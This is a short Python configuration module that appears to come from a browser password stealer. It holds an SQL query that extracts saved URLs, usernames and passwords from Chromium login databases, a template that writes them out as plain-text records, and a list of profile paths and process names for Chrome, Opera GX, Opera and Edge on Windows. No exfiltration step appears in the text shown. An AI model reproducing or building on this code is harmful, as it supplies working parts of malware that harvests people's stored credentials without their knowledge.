from os import environ

user_profile = environ.get("USERPROFILE")


class ChromiumConfig:
    PasswordsSQL = "SELECT action_url, username_value, password_value FROM logins"
    PasswordsData = "URL: {0}\nUsername: {1}\nPassword: {2}\n\n"


BrowsersData = [
    (
        "Chrome",
        rf"{user_profile}\AppData\Local\Google\Chrome\User Data",
        "chrome.exe",
    ),
    ("Opera GX",
     rf"{user_profile}\AppData\Roaming\Opera Software\Opera GX Stable",
     "opera.exe",
     ),
    ("Opera Default",
     rf"{user_profile}\AppData\Roaming\Opera Software\Opera Stable",
     "opera.exe",
     ),
    ("Microsoft Edge",
     rf"{user_profile}\AppData\Local\Microsoft\Edge\User Data",
     "msedge.exe",
     ),
]
